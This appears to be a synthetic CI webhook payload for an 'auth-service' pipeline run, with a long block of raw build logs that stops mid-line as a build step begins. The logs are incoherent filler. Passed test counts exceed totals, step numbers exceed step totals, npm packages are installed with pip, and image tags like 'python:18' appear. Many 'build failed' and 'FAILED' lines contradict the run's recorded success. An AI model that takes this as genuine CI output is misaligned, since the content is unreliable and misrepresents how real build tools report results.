{
  "action": "completed",
  "workflow_run": {
    "id": 449,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-275",
    "head_sha": "8fcd76c1bd91e00db9c107816bfd77714f26ab1f",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-23T12:18:53.956587Z",
    "updated_at": "2025-11-23T12:21:43.929502Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\npip: Downloading express-5.1.tar.gz\nStep 4/18: Testing\nUsing Node.js 14.9.8\nHEAD is now at 698193a\nTest Suites: 31 passed, 47 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: alpine:latest\nLayer 7/8: COPY command\nRan 60 tests in 37s\nCompleted.\nInstalling jest@2.16.7\nStep 4/22: Testing\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\nnpm install: resolved 486 packages\nAlready up to date.\nCompiling src/main.py...\nFAILED: test_api_health\nException: TypeError\nStep 17/20: Testing\nUploading artifact 'coverage' (44 files)\nPulling image: alpine:18\nFAILED: test_api_health\nFetching submodules...\nTests: 417 passed, 185 total\n[12:18:53] DEBUG: Initializing service\nnpm notice: package.json updated\nMinifying main.js\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: unit/test_user_create.spec.js\nVerifying...\nCompiling lib/handler.rs...\nnpm notice: created a lockfile\npip: Collecting prettier\n\u2713 Step 'build' succeeded\nStep 7/16: Testing\nnpm install: resolved 664 packages\n[12:18:53] WARN: Deprecated API usage\nTime: 12.824s\nCompleted.\nConnection established\nNODE_ENV=production\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed webpack-1.0\nEnvironment: production\nArtifact uploaded: dist.zip (57MB)\n[12:18:53] DEBUG: Loading configuration\n[12:18:53] ERROR: Connection failed\nStep 2/25: Running migrations\nProcessing...\nyarn add: Done in 6.94s\nNODE_ENV=test\nEnvironment: staging\npip: Installing build dependencies...\n[12:18:53] INFO: Processing request\nGenerating source maps...\nCompiling utils/main.py...\nConnection established\nRan 88 tests in 51s\nnpm notice: created a lockfile\nStep 8/22: Deploying\nFetching submodules...\nWARNING: jest has known vulnerabilities\nnpm install: resolved 1250 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_api_health\nTransforming 700 files...\n  PASS: unit/test_user_create.spec.js\n[12:18:53] WARN: Deprecated API usage\nStep 4/21: Running migrations\n\u2713 package completed\nAlready up to date.\n\u2717 build failed with exit code 73\n  PASS: e2e/test_user_create.spec.js\nTests: 479 passed, 208 total\nSwitched to branch 'feature/task-907'\nCompleted.\nProcessing...\nPulling image: alpine:latest\nGET /health - 201 (53ms)\nCache hit for key-1715\nStep 2/20: Deploying\nUploading artifact 'dist' (40 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\n[12:18:53] INFO: Processing request\nStep 14/20: Running migrations\nException: ValueError\nHEAD is now at 1f40769\nnpm notice: created a lockfile\nHEAD is now at caa57aa\nProcessing...\nInstalling eslint@4.17.9\nStep 20/17: Linting\n[12:18:53] INFO: Request completed\n[12:18:53] WARN: Deprecated API usage\n[12:18:53] DEBUG: Query executed in 22ms\nBundling runtime.css\nEnvironment: test\nnpm install: resolved 1928 packages\nGET /api - 200 (55ms)\nReady.\nBundling runtime.css\nChecking out develop branch\n[12:18:53] DEBUG: Initializing service\nSnapshots: 28 passed, 33 total\nNODE_ENV=test\nCompiling lib/main.py...\nPOST /api - 202 (189ms)\n\u2717 build failed with exit code 10\nnpm notice: created a lockfile\nStep 6/16: Deploying\nWaiting...\nLayer 3/8: ENV command\nVerifying...\nPushing to registry...\nWARNING: webpack has known vulnerabilities\nUploading artifact 'build' (10 files)\nDone.\n[12:18:53] INFO: Connecting to database\nnpm notice: created a lockfile\n\u2713 Step 'install' succeeded\nArtifact uploaded: build.tar.gz (44MB)\nTests: 375 passed, 215 total\nnpm install: added 107 packages\nWARNING: webpack has known vulnerabilities\nHEAD is now at 25f7739\nBuilding Docker image...\npip install: Successfully installed eslint-2.19\npip: Downloading jest-3.8.tar.gz\nConnection established\nTest Suites: 47 passed, 13 total\n[12:18:53] INFO: Starting build process\nFetching submodules...\nCompiling src/index.js...\nInstalling express@4.5.9\nOK\nGET /health - 201 (65ms)\nStep 2/21: Linting\nUploading artifact 'build' (27 files)\nWARNING: eslint has known vulnerabilities\nTest Suites: 22 passed, 34 total\nWaiting...\nTransforming 590 files...\nLayer 2/12: ENV command\nCache invalidated: node_modules\n\u2717 build failed with exit code 118\nStep 7/17: Building\n[12:18:53] DEBUG: Initializing service\nPulling image: node:latest\nHEAD is now at ba2bd1d\nStep 7/17: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /status - 204 (28ms)\nConnecting to startup.dev:443...\nCache saved successfully\nCompiling utils/utils.go...\n[12:18:53] INFO: Request completed\nPulling image: python:latest\n[12:18:53] DEBUG: Initializing service\nCoverage: 77% statements, 76% branches\n[12:18:53] DEBUG: Initializing service\nFetching submodules...\nnpm install: added 221 packages\nPOST /api - 200 (320ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nFinished.\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\n[12:18:53] DEBUG: Connection pool: 3 active\nCompiling components/main.py...\n  PASS: test_db_connect (399ms)\n  PASS: test_auth_login (145ms)\n[12:18:53] DEBUG: Initializing service\nStep 10/22: Building\nPulling image: node:18\nReady.\nSwitched to branch 'bugfix/task-470'\nBundling runtime.css\nArtifact downloaded: 45MB\nSuccess!\nTransforming 986 files...\nTime: 46.612s\nWaiting...\n[12:18:53] DEBUG: Memory usage: 1093MB\nTest Suites: 41 passed, 49 total\nTransforming 868 files...\n\u2717 build failed with exit code 46\n\u2713 All checks passed\nConnection established\nnpm notice: package.json updated\nPOST /data - 201 (118ms)\n[12:18:53] DEBUG: Initializing service\nTest Suites: 48 passed, 40 total\nCache invalidated: dependencies\nnpm notice: package.json updated\nInstalling prettier@5.9.5\nTest Suites: 7 passed, 35 total\nStep 1/17: Installing dependencies\nnpm install: added 209 packages\nTLS handshake completed\n[12:18:53] DEBUG: Initializing service\n[12:18:53] WARN: Deprecated API usage\npip install: Successfully installed prettier-4.9\nnpm install: resolved 1362 packages\n\u2713 deploy completed\n[12:18:53] DEBUG: Initializing service\nSwitched to branch 'hotfix/task-933'\nCache miss for key-8882\nnpm install: resolved 614 packages\nnpm notice: package.json updated\nWARNING: webpack has known vulnerabilities\nFetching submodules...\nProcessing...\nTest Suites: 41 passed, 38 total\nCompleted.\nWaiting...\nCreating production build...\nTransforming 421 files...\nReady.\nEnvironment: staging\n[12:18:53] ERROR: Connection failed\nWARNING: prettier has known vulnerabilities\n\u2713 Step 'test' succeeded\nEnvironment: development\nCoverage: 95% statements, 74% branches\nUsing Python 3.9\nArtifact uploaded: dist.zip (40MB)\nCoverage: 82% statements, 79% branches\nWaiting...\nSnapshots: 26 passed, 15 total\nWARNING: axios has known vulnerabilities\nStep 7/24: Installing dependencies\nnpm notice: package.json updated\nSwitched to branch 'hotfix/task-979'\nStep 9/22: Running migrations\nGET /api - 200 (12ms)\nStep 9/15: Deploying\nException: TypeError\n[12:18:53] DEBUG: Memory usage: 1512MB\nStep 9/22: Running migrations\nCompiling src/app.ts...\nCache saved successfully\nPushing to registry...\nCache invalidated: build\nDone.\npip install: Successfully installed lodash-4.11\nPlatform: linux-x64\nyarn add: Done in 26.62s\nFetching submodules...\nStep 19/18: Deploying\nCompiling lib/handler.rs...\nCoverage: 73% statements, 92% branches\nCompiling lib/index.js...\nCache invalidated: node_modules\n[12:18:53] DEBUG: Loading configuration\nPushing to registry...\n\u2713 Task completed in 4539ms\nStep 15/17: Testing\nArtifact uploaded: dist.zip (10MB)\nTest Suites: 13 passed, 23 total\nEnvironment: staging\nNODE_ENV=production\nCompiling src/service.java...\nStep 20/18: Running migrations\npip install: Successfully installed jest-2.5\nOptimizing 84 modules...\nCompiling src/handler.rs...\nPushing to registry...\n[12:18:53] DEBUG: Memory usage: 528MB\nTests: 156 passed, 282 total\nEnvironment: production\n\u2713 Task completed in 4509ms\nGET /api - 201 (31ms)\n[12:18:53] DEBUG: Connection pool: 13 active\nHEAD is now at 4875e5e\nCompiling components/service.java...\n\u2713 Task completed in 2908ms\nWARNING: webpack has known vulnerabilities\nWARNING: express has known vulnerabilities\nReady.\nPulling image: python:latest\nnpm install: resolved 561 packages\nOptimizing 92 modules...\n\u2713 All checks passed\n  PASS: e2e/test_api_health.spec.js\npip: Downloading eslint-2.14.tar.gz\n[12:18:53] DEBUG: Connection pool: 9 active\nUsing Node.js 19.7.6\nnpm notice: created a lockfile\npip install: Successfully installed prettier-2.4\n[12:18:53] INFO: Request completed\nCache saved successfully\nCompiling components/handler.rs...\n[12:18:53] DEBUG: Memory usage: 1193MB\nReady.\nFinished.\nTransforming 580 files...\nReady.\n[12:18:53] DEBUG: Loading configuration\nWARNING: axios has known vulnerabilities\n\u2717 build failed with exit code 119\nCache saved successfully\n[12:18:53] INFO: Starting build process\nSwitched to branch 'hotfix/task-252'\nDone.\nRan 67 tests in 10s\nPlatform: win32-x64\nCoverage: 79% statements, 89% branches\n\u2713 Step 'install' succeeded\nLayer 7/15: ENV command\nAlready up to date.\nCompiling lib/index.js...\nCache saved successfully\nChecking out main branch\n  PASS: e2e/test_api_health.spec.js\nWaiting...\nyarn add: Done in 12.61s\nImage pulled successfully\n[12:18:53] INFO: Request completed\nStep 1/16: Linting\npip: Installing build dependencies...\nCompiling src/app.ts...\nLoading...\nCache hit for key-5939\npip: Downloading eslint-1.2.tar.gz\n[12:18:53] DEBUG: Query executed in 99ms\nInstalling jest@5.8.5\nSwitched to branch 'feature/task-851'\nMinifying app.js\nUsing Python 3.10\nStep 13/22: Building\nCache hit for key-8728\nCompiling components/utils.go...\npip: Installing build dependencies...\nFetching submodules...\nWARNING: react has known vulnerabilities\n[12:18:53] INFO: Starting build process\n[12:18:53] DEBUG: Memory usage: 1015MB\n[12:18:53] DEBUG: Connection pool: 15 active\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nCache restored successfully (414MB)\nStep 7/25: Installing dependencies\nCompiling utils/main.py...\npip: Installing build dependencies...\nCreating production build...\nArtifact uploaded: dist.zip (3MB)\nCoverage: 72% statements, 76% branches\nTests: 102 passed, 66 total\nCache restored successfully (269MB)\nFetching submodules...\nInstalling lodash@5.14.2\nWARNING: react has known vulnerabilities\n\u2713 lint completed\nNODE_ENV=development\nSnapshots: 20 passed, 1 total\nTransforming 466 files...\n[12:18:53] INFO: Connecting to database\nFAILED: test_api_health\nTests: 82 passed, 331 total\nStep 18/20: Linting\nCompiling lib/app.ts...\nnpm notice: package.json updated\nnpm install: resolved 201 packages\nCache invalidated: node_modules\nBuilding Docker image...\nTransforming 728 files...\nStep 9/24: Installing dependencies\n[12:18:53] WARN: Deprecated API usage\nWaiting...\nCache miss for key-6978\nCompiling lib/service.java...\nVerifying...\nVerifying...\nTest Suites: 9 passed, 6 total\n  PASS: e2e/test_auth_login.spec.js\n\u2713 Step 'build' succeeded\npip install: Successfully installed jest-3.18\nSwitched to branch 'feature/task-471'\n[12:18:53] WARN: Deprecated API usage\nOptimizing 81 modules...\nMinifying app.js\nCache restored successfully (498MB)\nUploading artifact 'coverage' (21 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\n\u2713 build completed\nWARNING: react has known vulnerabilities\npip: Installing build dependencies...\nImage pulled successfully\n\u2717 build failed with exit code 68\n[12:18:53] INFO: Request completed\nGET /api - 201 (31ms)\nSuccess!\n[12:18:53] INFO: Cache refreshed\nPulling image: python:latest\nPulling image: python:18\nVerifying...\nCache hit for key-8011\nCache invalidated: dependencies\nCache invalidated: build\nCache miss for key-1750\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying app.js\nOK\n[12:18:53] WARN: Deprecated API usage\nAlready up to date.\nGenerating source maps...\nCompiling lib/index.js...\nUsing Python 3.10\nCache hit for key-9542\nPlatform: linux-x64\nLayer 6/12: RUN command\nWARNING: react has known vulnerabilities\n  PASS: unit/test_user_create.spec.js\nPlatform: darwin-arm64\nSwitched to branch 'feature/task-741'\nGET /health - 200 (87ms)\nCoverage: 98% statements, 83% branches\nEnvironment: development\nPOST /data - 201 (455ms)\nPlatform: win32-x64\n[12:18:53] ERROR: Connection failed\nStep 17/15: Deploying\n[12:18:53] DEBUG: Connection pool: 5 active\nCache saved successfully\nBuilding Docker image...\nChecking out main branch\nPOST /upload - 201 (217ms)\npip: Downloading express-4.8.tar.gz\nnpm notice: package.json updated\n[12:18:53] INFO: Starting build process\nRan 76 tests in 20s\n\u2713 build completed\nWaiting...\nOptimizing 21 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:53] DEBUG: Connection pool: 13 active\n[12:18:53] INFO: Starting build process\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading jest-3.10.tar.gz\nCreating production build...\nOptimizing 72 modules...\n  PASS: test_auth_login (328ms)\nOK\nArtifact downloaded: 13MB\nImage pulled successfully\nCompiling utils/index.js...\nTLS handshake completed\n[12:18:53] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 38MB\n[12:18:53] INFO: Processing request\n[12:18:53] INFO: Cache refreshed\nPlatform: darwin-arm64\nTransforming 670 files...\nFAILED: test_api_health\n[12:18:53] INFO: Processing request\nyarn add: Done in 20.86s\nImage pulled successfully\npip: Downloading express-3.3.tar.gz\nStep 6/20: Testing\nOK\nStep 2/21: Deploying\nCompiling src/service.java...\nnpm install: resolved 595 packages\nPushing to registry...\nTransforming 850 files...\n[12:18:53] INFO: Starting build process\n  PASS: unit/test_cache_hit.spec.js\nCache restored successfully (427MB)\nUploading artifact 'coverage' (30 files)\nChecking out develop branch\n[12:18:53] DEBUG: Memory usage: 663MB\nTime: 50.627s\nStep 3/15: Installing dependencies\nyarn add: Done in 27.3s\n[12:18:53] DEBUG: Loading configuration\nStep 8/16: Running migrations\n[12:18:53] INFO: Processing request\nTest Suites: 33 passed, 22 total\nBundling main.css\nCompiling components/app.ts...\n[12:18:53] INFO: Starting build process\n\u2713 validate completed\nCoverage: 90% statements, 86% branches\npip: Collecting jest\nCompiling src/app.ts...\n[12:18:53] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\n\u2713 package completed\nStep 19/16: Building\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nnpm notice: package.json updated\nGET /api - 200 (76ms)\nLoading...\nStep 13/18: Testing\nStep 11/17: Installing dependencies\nStep 20/22: Building\n\u2713 Step 'test' succeeded\nGET /status - 204 (21ms)\npip install: Successfully installed webpack-4.6\nCache saved successfully\nInstalling webpack@1.2.8\nChecking out master branch\nAlready up to date.\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\n[12:18:53] INFO: Request completed\nConnecting to startup.dev:443...\nSuccess!\nChecking out develop branch\n[12:18:53] WARN: Deprecated API usage\nFinished.\nFinished.\n[12:18:53] DEBUG: Loading configuration\nnpm notice: package.json updated\nPOST /api - 201 (208ms)\nImage pulled successfully\n\u2717 build failed with exit code 51\n[12:18:53] INFO: Connecting to database\n\u2713 All checks passed\nPlatform: darwin-arm64\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:53] INFO: Processing request\n[12:18:53] INFO: Cache refreshed\n\u2713 Step 'setup' succeeded\nStep 12/17: Installing dependencies\n[12:18:53] DEBUG: Loading configuration\nCache restored successfully (156MB)\n[12:18:53] DEBUG: Initializing service\n  PASS: unit/test_api_health.spec.js\nTime: 63.610s\nOptimizing 90 modules...\nMinifying main.js\nAlready up to date.\nWARNING: axios has known vulnerabilities\n[12:18:54] INFO: Request completed\nTLS handshake completed\nLayer 1/8: COPY command\nConnection established\n\u2713 Task completed in 1392ms\nyarn add: Done in 3.79s\n\u2713 Task completed in 4208ms\n[12:18:54] DEBUG: Memory usage: 1515MB\n[12:18:54] DEBUG: Loading configuration\nTLS handshake completed\nCompiling src/service.java...\nTLS handshake completed\n  PASS: test_cache_hit (361ms)\nWARNING: express has known vulnerabilities\nChecking out master branch\nBundling vendor.css\nyarn add: Done in 3.84s\n[12:18:54] DEBUG: Query executed in 73ms\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: jest has known vulnerabilities\n[12:18:54] DEBUG: Connection pool: 18 active\npip: Collecting prettier\nWARNING: lodash has known vulnerabilities\nWARNING: react has known vulnerabilities\n\u2713 All checks passed\nPulling image: alpine:latest\nGET /status - 200 (100ms)\nCompiling utils/handler.rs...\n[12:18:54] DEBUG: Connection pool: 5 active\nBundling styles.css\n[12:18:54] INFO: Connecting to database\nLoading...\n[12:18:54] WARN: Deprecated API usage\n\u2713 Task completed in 3195ms\nStep 3/18: Deploying\nGET /health - 201 (15ms)\n[12:18:54] INFO: Request completed\nCache hit for key-8156\nStep 2/16: Testing\nFetching submodules...\nFinished.\n\u2713 package completed\nGenerating source maps...\nProcessing...\nStep 12/22: Linting\nnpm notice: package.json updated\n[12:18:54] INFO: Starting build process\nEnvironment: development\nOptimizing 42 modules...\nCompiling components/handler.rs...\nBundling vendor.css\n\u2717 build failed with exit code 102\n\u2713 All checks passed\n[12:18:54] INFO: Request completed\n[12:18:54] DEBUG: Initializing service\npip: Collecting lodash\nBuilding Docker image...\nStep 9/25: Running migrations\nTLS handshake completed\nGET /api - 200 (61ms)\n\u2713 All checks passed\nCreating production build...\nOK\n[12:18:54] WARN: Deprecated API usage\nTest Suites: 48 passed, 48 total\nArtifact uploaded: dist.zip (42MB)\nCache hit for key-5873\nProcessing...\nSwitched to branch 'hotfix/task-628'\nConnection established\nCompiling utils/app.ts...\nnpm install: resolved 766 packages\nTime: 33.207s\nException: NullPointerException\nImage pulled successfully\nyarn add: Done in 25.12s\n[12:18:54] INFO: Request completed\nCache miss for key-2479\nProcessing...\nSnapshots: 6 passed, 29 total\n[12:18:54] WARN: Deprecated API usage\nCache hit for key-1673\n\u2713 package completed\n[12:18:54] DEBUG: Loading configuration\n[12:18:54] DEBUG: Loading configuration\n\u2713 package completed\nnpm install: resolved 620 packages\nPulling image: node:18\nStep 19/21: Running migrations\nAlready up to date.\n[12:18:54] WARN: Deprecated API usage\nOK\n[12:18:54] DEBUG: Memory usage: 1733MB\nTransforming 819 files...\nImage pulled successfully\nSwitched to branch 'bugfix/task-465'\nPlatform: linux-x64\nPOST /data - 202 (266ms)\nCache restored successfully (234MB)\n  PASS: test_api_health (402ms)\nCoverage: 73% statements, 85% branches\nnpm notice: package.json updated\nFAILED: test_user_create\nStep 15/18: Testing\nReady.\nnpm install: added 259 packages\n  PASS: test_cache_hit (25ms)\nProcessing...\nHEAD is now at 2d34f8c\nCompleted.\n\u2713 Task completed in 2881ms\nStep 3/21: Testing\nStep 20/18: Linting\nOptimizing 17 modules...\nnpm notice: package.json updated\nPlatform: linux-x64\n[12:18:54] WARN: Deprecated API usage\nMinifying vendor.js\nWaiting...\nCache restored successfully (424MB)\nVerifying...\nLoading...\nGET /health - 204 (25ms)\nStep 18/25: Linting\n\u2713 build completed\nPOST /data - 202 (12ms)\nOK\nReady.\nStep 10/17: Building\n  PASS: unit/test_db_connect.spec.js\n[12:18:54] DEBUG: Connection pool: 17 active\nStep 12/17: Building\nUploading artifact 'build' (10 files)\nInstalling axios@5.7.2\nnpm install: resolved 381 packages\n[12:18:54] WARN: Deprecated API usage\nUsing Python 3.9\nArtifact downloaded: 50MB\nCreating production build...\nStep 10/19: Linting\nSuccess!\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nFAILED: test_auth_login\nSwitched to branch 'bugfix/task-280'\n[12:18:54] DEBUG: Connection pool: 4 active\n[12:18:54] INFO: Starting build process\n[12:18:54] WARN: Deprecated API usage\n[12:18:54] DEBUG: Initializing service\n[12:18:54] DEBUG: Connection pool: 12 active\n\u2713 Step 'checkout' succeeded\n[12:18:54] INFO: Cache refreshed\nArtifact downloaded: 9MB\n[12:18:54] DEBUG: Initializing service\nnpm notice: package.json updated\nLayer 10/13: RUN command\npip: Collecting express\nTransforming 723 files...\nStep 4/20: Deploying\nNODE_ENV=test\nTLS handshake completed\nInstalling eslint@5.15.1\nCompiling components/index.js...\nPulling image: python:18\nPushing to registry...\npip install: Successfully installed axios-5.10\nnpm notice: created a lockfile\nCompiling utils/handler.rs...\nGET /status - 204 (89ms)\nNODE_ENV=test\nEnvironment: staging\nConnection established\nStep 14/16: Testing\nSuccess!\n  PASS: test_auth_login (217ms)\n[12:18:54] INFO: Request completed\nnpm install: added 393 packages\nEnvironment: development\nWARNING: prettier has known vulnerabilities\npip install: Successfully installed prettier-2.3\nLayer 1/11: COPY command\nPushing to registry...\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: e2e/test_user_create.spec.js\nReady.\nUsing Node.js 20.10.10\nConnection established\nVerifying...\n[12:18:54] DEBUG: Initializing service\nCompiling lib/app.ts...\nImage pulled successfully\nWaiting...\nBuilding Docker image...\nCompiling src/main.py...\nPlatform: linux-x64\nSwitched to branch 'feature/task-458'\nSuccess!\n[12:18:54] DEBUG: Query executed in 14ms\nRan 113 tests in 39s\nEnvironment: staging\nPulling image: python:3.11\n\u2713 All checks passed\nFAILED: test_cache_hit\nCreating production build...\nSuccess!\nCache restored successfully (261MB)\nPOST /data - 201 (351ms)\nStep 3/21: Testing\nVerifying...\n[12:18:54] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\nUploading artifact 'coverage' (25 files)\nArtifact uploaded: dist.zip (33MB)\n\u2713 Task completed in 2757ms\nTLS handshake completed\npip: Installing build dependencies...\npip: Downloading eslint-1.8.tar.gz\nStep 9/21: Linting\nCompiling src/index.js...\n\u2713 Step 'install' succeeded\npip: Collecting express\nPlatform: linux-x64\nnpm notice: package.json updated\nSuccess!\nPushing to registry...\nUsing Python 3.11\nCompiling utils/service.java...\nStep 11/18: Installing dependencies\nCompiling lib/utils.go...\nSuccess!\nFinished.\nGET /status - 204 (55ms)\n[12:18:54] INFO: Cache refreshed\nSwitched to branch 'hotfix/task-708'\nTime: 27.237s\nPulling image: node:latest\nHEAD is now at e2adb06\nArtifact uploaded: build.tar.gz (10MB)\npip: Installing build dependencies...\nCreating production build...\npip: Collecting express\n[12:18:54] INFO: Starting build process\nPlatform: linux-x64\nStep 13/19: Running migrations\nBundling runtime.css\n  PASS: unit/test_api_health.spec.js\nStep 5/23: Building\n[12:18:54] DEBUG: Memory usage: 270MB\nSnapshots: 48 passed, 40 total\nyarn add: Done in 2.73s\n\u2713 Task completed in 769ms\n[12:18:54] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (36MB)\nnpm install: resolved 454 packages\nStep 20/18: Linting\n[12:18:54] DEBUG: Query executed in 12ms\n[12:18:54] DEBUG: Memory usage: 1406MB\nConnection established\n\u2713 All checks passed\n[12:18:54] WARN: Deprecated API usage\nOptimizing 25 modules...\nCache saved successfully\npip: Installing build dependencies...\nLoading...\n[12:18:54] INFO: Request completed\nTime: 5.977s\nOptimizing 24 modules...\nBuilding Docker image...\nCache invalidated: node_modules\nTests: 416 passed, 81 total\nWaiting...\nGET /health - 204 (57ms)\n[12:18:54] WARN: Deprecated API usage\npip: Collecting axios\nArtifact downloaded: 6MB\n[12:18:54] DEBUG: Loading configuration\nDone.\nGET /api - 201 (69ms)\nChecking out main branch\nStep 14/24: Building\nMinifying vendor.js\nConnecting to example.com:443...\n[12:18:54] INFO: Request completed\n\u2713 test completed\nCompiling components/utils.go...\n\u2713 Step 'setup' succeeded\nConnecting to test.io:443...\nyarn add: Done in 30.62s\nImage pulled successfully\nSwitched to branch 'bugfix/task-258'\nTransforming 375 files...\npip: Collecting express\n[12:18:54] WARN: Deprecated API usage\nGenerating source maps...\nCache invalidated: node_modules\nyarn add: Done in 7.27s\n[12:18:54] INFO: Connecting to database\nCompiling lib/handler.rs...\nLayer 5/10: ENV command\nBuilding Docker image...\nStep 3/21: Running migrations\n[12:18:54] DEBUG: Memory usage: 1872MB\nWARNING: prettier has known vulnerabilities\nCompleted.\nFAILED: test_cache_hit\nWaiting...\nStep 2/20: Building\nEnvironment: production\nHEAD is now at fdf481b\nReady.\nCache hit for key-9703\nUsing Python 3.10\nGET /status - 204 (16ms)\n=== Step restore_cache completed ===\n=== Step: lint ===\n[12:18:54] WARN: Deprecated API usage\nStep 1/23: Running migrations\nPushing to registry...\nnpm notice: created a lockfile\nGenerating source maps...\npip: Installing build dependencies...\nPOST /data - 200 (111ms)\nCompiling utils/main.py...\nChecking out main branch\n[12:18:54] DEBUG: Connection pool: 19 active\n[12:18:54] DEBUG: Initializing service\nUsing Python 3.11\nEnvironment: test\nConnection established\n[12:18:54] DEBUG: Loading configuration\nEnvironment: staging\nStep 18/21: Installing dependencies\n\u2713 Step 'checkout' succeeded\n[12:18:54] ERROR: Connection failed\nNODE_ENV=production\nCompiling src/main.py...\nPlatform: win32-x64\n[12:18:54] DEBUG: Loading configuration\nLoading...\nCoverage: 90% statements, 62% branches\nNODE_ENV=test\nyarn add: Done in 5.36s\nCompiling src/index.js...\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 19/17: Linting\n[12:18:54] INFO: Processing request\n[12:18:54] WARN: Deprecated API usage\nStep 15/15: Installing dependencies\nUsing Node.js 17.20.5\n[12:18:54] DEBUG: Initializing service\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:54] DEBUG: Connection pool: 1 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nUsing Python 3.11\nFetching submodules...\nPlatform: win32-x64\nUsing Python 3.9\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\npip: Downloading lodash-5.14.tar.gz\nCache miss for key-9396\nLoading...\nImage pulled successfully\nImage pulled successfully\nStep 12/23: Installing dependencies\n[12:18:54] DEBUG: Memory usage: 1716MB\nOptimizing 47 modules...\nDone.\nStep 9/15: Deploying\n[12:18:54] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\n[12:18:54] DEBUG: Memory usage: 218MB\n[12:18:54] INFO: Request completed\nUsing Python 3.10\nStep 19/17: Testing\nReady.\nConnection established\n[12:18:54] WARN: Deprecated API usage\nCompiling lib/service.java...\nCompiling utils/index.js...\n[12:18:54] INFO: Cache refreshed\nUsing Node.js 15.16.5\nInstalling react@1.15.6\nnpm install: resolved 327 packages\nEnvironment: development\npip: Downloading lodash-2.1.tar.gz\nTime: 95.325s\n  PASS: e2e/test_cache_hit.spec.js\nyarn add: Done in 10.71s\nUsing Node.js 19.2.6\nCompiling components/app.ts...\nChecking out develop branch\n  PASS: e2e/test_api_health.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nGenerating source maps...\nnpm install: added 435 packages\nOptimizing 15 modules...\nGET /health - 201 (41ms)\n[12:18:54] INFO: Processing request\nFinished.\nException: TypeError\nPOST /data - 201 (94ms)\npip: Downloading webpack-3.14.tar.gz\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 1/22: Running migrations\nConnecting to cloud.services:443...\nUploading artifact 'coverage' (12 files)\n[12:18:54] INFO: Processing request\nTests: 414 passed, 125 total\nStep 17/18: Deploying\nEnvironment: development\n[12:18:54] WARN: Deprecated API usage\nImage pulled successfully\nLoading...\nCompleted.\nFinished.\nMinifying vendor.js\nCache miss for key-8361\nTime: 10.464s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 16/15: Running migrations\nMinifying main.js\nnpm install: resolved 1293 packages\nOptimizing 38 modules...\nEnvironment: test\nWARNING: express has known vulnerabilities\nVerifying...\nFetching submodules...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /data - 201 (229ms)\n\u2713 Task completed in 626ms\nnpm notice: package.json updated\n[12:18:54] DEBUG: Query executed in 62ms\nFinished.\nArtifact downloaded: 23MB\nCompiling utils/index.js...\n[12:18:54] WARN: Deprecated API usage\nTransforming 610 files...\nProcessing...\nnpm notice: package.json updated\nStep 19/24: Deploying\nImage pulled successfully\n\u2713 Step 'build' succeeded\nConnection established\nEnvironment: staging\n[12:18:54] INFO: Cache refreshed\nImage pulled successfully\n[12:18:54] INFO: Cache refreshed\nHEAD is now at 7162cb4\nGET /health - 204 (4ms)\nnpm install: added 118 packages\nEnvironment: development\nPlatform: win32-x64\n\u2717 build failed with exit code 16\n[12:18:54] WARN: Deprecated API usage\nCompleted.\nReady.\nOK\nGenerating source maps...\nEnvironment: test\nUploading artifact 'build' (8 files)\npip: Installing build dependencies...\nPushing to registry...\nTest Suites: 50 passed, 12 total\n[12:18:54] INFO: Request completed\n[12:18:54] INFO: Connecting to database\n[12:18:54] DEBUG: Query executed in 61ms\nCompiling src/main.py...\npip: Installing build dependencies...\n[12:18:54] DEBUG: Connection pool: 1 active\nCache miss for key-3787\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 49MB\nPOST /api - 200 (85ms)\nWARNING: jest has known vulnerabilities\nOK\n=== Step lint completed ===\n=== Step: build ===\n[12:18:54] 